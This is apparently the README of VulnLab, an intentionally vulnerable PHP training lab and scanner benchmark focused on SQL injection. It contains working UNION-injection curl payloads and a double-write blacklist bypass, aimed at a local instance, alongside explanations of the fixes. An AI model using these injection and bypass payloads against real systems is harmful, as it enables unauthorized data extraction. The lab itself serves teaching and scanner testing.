# VulnLab — 自研 Web 漏洞靶场与 PoC 基准集

> 用 PHP 从零写一个覆盖 OWASP Top 10 的漏洞靶场。**每个漏洞都配源码、Writeup、机读 PoC 与修复对照。**
>
> 规格：`??` → 见下方[漏洞矩阵](#漏洞矩阵)

**为什么这个靶场和别的不一样**

大多数靶场只提供「有漏洞的页面」。VulnLab 额外做了四件事：

| | 多数靶场 | VulnLab |
|---|---|---|
| 源码可见性 | 要自己去翻仓库 | 页面右上角一键查看当前页源码 |
| 语句级反馈 | 无 | **页面直接贴出服务端实际执行的 SQL** |
| 修复教学 | 通常没有 | 每个漏洞配 `high` 档修复对照 + 为什么有效 |
| 自动化 | 无 | 每个漏洞配**可被扫描器消费的 YAML PoC**，可作评测基准 |

第三点和第四点是重点。一个只会教你「这里有漏洞」的靶场，培养出的是只会说「这里有问题」的人；
而真正需要说清的是「应该怎么修，以及为什么这么修有效」。

---

## 文档

| 文档 | 内容 |
|---|---|
| [docs/DESIGN.md](docs/DESIGN.md) | **技术栈、设计原理、教学设计、与现有靶场的差异** |
| [writeups/sqli.md](writeups/sqli.md) | SQL 注入完整 Writeup（原理 → 利用 → 修复） |
| 本 README | 项目概览、漏洞矩阵、快速开始 |

---

## 快速开始

### 方式一：零依赖（推荐）

只要本机有 **PHP 7.2+**（需启用 `pdo_sqlite`，PHP 官方 Windows 包默认自带）：

```bash
# Windows
start.bat

# Linux / macOS / Git Bash
chmod +x start.sh && ./start.sh

# 或者手动指定 PHP 路径
set PHP=D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\php.exe
start.bat
```

打开 <http://127.0.0.1:8080>。

**不需要 MySQL，不需要建库导数据。** 首次访问时 `config.php` 会自动创建
`html/data/vulnlab.db` 并灌入种子数据。这是刻意的设计取舍：
让「clone 下来」到「看到漏洞」之间只隔一条命令，否则大部分人会在配置环境这一步放弃。

### 方式二：Docker

```bash
docker compose up
```

### 验证漏洞

```bash
python pocs/poc_sqli.py
```

零第三方依赖（只用标准库），会依次完成报错型检测、列数探测、
UNION 拖库、黑名单绕过与修复有效性验证。

---

## 漏洞矩阵

| 漏洞类型 | low | medium | high（修复对照） | Writeup | 机读 PoC |
|---|:--:|:--:|:--:|:--:|:--:|
| **SQL 注入** | ✓ | ✓ | ✓ | [sqli.md](writeups/sqli.md) | ✓ |
| XSS（反射 / 存储 / DOM） | 规划中 | — | — | — | — |
| 文件上传绕过 | 规划中 | — | — | — | — |
| SSRF（含 gopher 打 Redis） | 规划中 | — | — | — | — |
| PHP 反序列化（POP 链） | 规划中 | — | — | — | — |
| 越权（水平 / 垂直 / IDOR） | 规划中 | — | — | — | — |
| 命令注入与过滤绕过 | 规划中 | — | — | — | — |
| 文件包含（LFI / RFI） | 规划中 | — | — | — | — |
| XXE | 规划中 | — | — | — | — |
| JWT 伪造与弱密钥 | 规划中 | — | — | — | — |
| CSRF | 规划中 | — | — | — | — |
| SSTI | 规划中 | — | — | — | — |

> 每新增一个场景，都要同时补齐 **Writeup + PoC + 修复对照** 三件套。
> 只加一个「有漏洞的页面」不算完成 —— 这是本项目的硬性约定。

### SQL 注入三档的设计

三档不是「同一个漏洞重复三遍」，而是三种**不同性质**的防护与对应的绕过思路：

| 档位 | 防护手段 | 注入点类型 | 绕过关键 | 教学重点 |
|---|---|---|---|---|
| `low` | 无 | 数字型（无引号） | 直接 UNION，不需要闭合引号 | 先判断「有没有引号」 |
| `medium` | 关键字黑名单 `str_ireplace` | 字符型（有引号） | **双写绕过**：`ununionion` → `union` | **黑名单原理上必败** |
| `high` | 参数化查询 + 类型校验 | 不可注入 | — | 根治手段与「数据代码分离」 |

`medium` 档的绕过特别值得看：`str_ireplace` 是**单次非递归**替换，
删掉 `ununionion` 中间的 `union` 之后，剩下的 `un` + `ion` 正好拼回 `union`。
页面会把「你的输入」和「过滤后」并排显示出来，你能量化地看到过滤器做了什么。

---

## 实测利用链

```bash
# ① low 档：数字型 UNION 注入，直接拖出通关凭证
curl "http://127.0.0.1:8080/sqli/low.php?id=-1%20UNION%20SELECT%201,username,secret,role%20FROM%20users"
# → VULNLAB{union_select_master}

# ② medium 档：先试 low 的 payload（会被过滤打不动）
curl "http://127.0.0.1:8080/sqli/medium.php?id=1'%20union%20select%201,username,secret,role%20from%20users--%20"
# → 过滤器检测到敏感关键字 → 数据库错误

# ③ medium 档：双写绕过
curl "http://127.0.0.1:8080/sqli/medium.php?id=1'%20ununionion%20seselectlect%201,username,secret,role%20frfromom%20users--%20"
# → VULNLAB{union_select_master}

# ④ high 档：同一 payload 被类型校验挡在数据库之前
curl "http://127.0.0.1:8080/sqli/high.php?id=-1%20UNION%20SELECT%201,username,secret,role%20FROM%20users"
# → 输入被拒绝：参数 id 必须是纯数字
```

---

## 作为扫描器评测基准

`pocs/` 下的 PoC 是**机读**的，可直接被支持该格式的扫描引擎加载：

```bash
# 用配套的攻击面平台引擎跑本靶场
cd ../attack-surface
python -m asp.cli poc run http://127.0.0.1:8080 --dir ../vulnlab/pocs
```

实测输出（7 个 PoC，0.17 秒）：

```
high    vulnlab-sqli-low-union      http://127.0.0.1:8080/sqli/low.php?id=-1%20UNION...   1.00
high    sql-injection-error-based   http://127.0.0.1:8080/sqli/low.php?id=1%27            0.80
high    sql-injection-error-based   http://127.0.0.1:8080/sqli/medium.php?id=1%27         0.80
```

为什么它能当基准？

1. **每个场景的 URL 是确定的** —— 不用猜路径
2. **「有没有漏洞」的答案是确定的** —— 低档有、高档没有，不存在模糊地带
3. **提供误报诱饵** —— `high` 档就是天然的假阳性测试点：
   扫描器如果在这里报「存在 SQL 注入」，说明它的判定逻辑有问题

第 3 点尤其有用。**一个只会说「到处都有漏洞」的扫描器，比什么都不报更糟。**

---

## 目录结构

```
vulnlab/
├── html/                       # Web 根目录（php -S 的 docroot）
│   ├── index.php               # 漏洞矩阵首页
│   ├── config.php              # 配置 + 数据库自动初始化 + 种子数据
│   ├── source.php              # 源码查看器（顺便演示「任意文件读取」怎么防）
│   ├── lib/
│   │   └── layout.php          # 页面布局组件
│   ├── sqli/
│   │   ├── low.php             # 数字型注入，无防护
│   │   ├── medium.php          # 黑名单过滤，可双写绕过
│   │   └── high.php            # 参数化查询（修复对照）
│   └── data/                   # SQLite 数据文件（运行时生成，不入库）
├── writeups/
│   └── sqli.md                 # SQL 注入完整 Writeup
├── pocs/
│   ├── vulnlab-sqli-low-union.yaml     # 机读 PoC（确定性检测 + 提取凭证）
│   ├── sql-injection-error-based.yaml  # 机读 PoC（报错型存在性检测）
│   └── poc_sqli.py                     # 独立 PoC 脚本（零依赖）
├── docker-compose.yml
├── Dockerfile
├── start.bat / start.sh
└── README.md
```

---

## Writeup 收录

- [SQL 注入完整 Writeup](writeups/sqli.md) —— 原理 → 注入点类型判断 → 列数探测 → 回显位定位 →
  UNION 拖库 → 布尔/时间盲注思路 → 黑名单绕过（含 6 种绕过手法）→ 修复原理 → 防御清单

---

## 一个真实的调试记录

项目开发过程中，「列数探测」和「Swagger 暴露检测」都踩了同一个坑：

> 数据库的报错信息会把**出错的语句原文**回显出来，而我们的 payload 就在那段原文里。
> 于是「注入失败但报错回显」也会让标记串出现 —— 报出的列数是 1 而不是 4。

**检测特征被检测行为本身「制造」了出来** —— 这是扫描器误报最典型的来源。

修复方式：

1. 用**反向匹配器**（`negative: true`）把错误页整类排除
2. 改用**结构化特征**（JSON 里的 `"paths": {`）而不是裸关键词（`swagger`）

修完之后在靶场上误报从 6 条降到 3 条，剩下的 3 条全是真实的 SQL 注入。

相关代码与注释见：
- `pocs/poc_sqli.py` 的 `detect_columns()`
- `pocs/vulnlab-sqli-low-union.yaml` 的 negative matcher
- 配套平台的 `asp/pocs/swagger-api-docs-exposure.yaml`

---

## ⚠️ 免责声明

**本项目是故意包含漏洞的教学代码。**

- ✅ 允许：本地环境学习、授权渗透测试培训、扫描器效果评测、CTF 训练
- ❌ 禁止：部署到公网、用于任何未经授权的测试、把其中代码用于生产系统

靶场中的「凭据」全是假数据，`secret` 字段只是可验证的通关标记，不含任何真实信息。

**所有测试请只针对你自己拥有或已获得书面授权的目标。**

---

## 路线图

- [x] SQL 注入（low / medium / high + Writeup + PoC）
- [ ] XSS（反射 / 存储 / DOM）
- [ ] 文件上传绕过（后缀 / MIME / 内容检测 / 条件竞争）
- [ ] SSRF（含 gopher 协议打内网 Redis）
- [ ] PHP 反序列化（POP 链构造、`__wakeup` 绕过）
- [ ] 越权（水平 / 垂直 / IDOR）
- [ ] 命令注入与过滤绕过
- [ ] 文件包含（LFI / RFI / `php://filter` 读源码）
- [ ] JWT 伪造与弱密钥爆破
- [ ] 为每个漏洞补充「自动化利用脚本」与「基准测试用例集」

---

## 许可

MIT（教学用途）。使用者需自行确保合规。
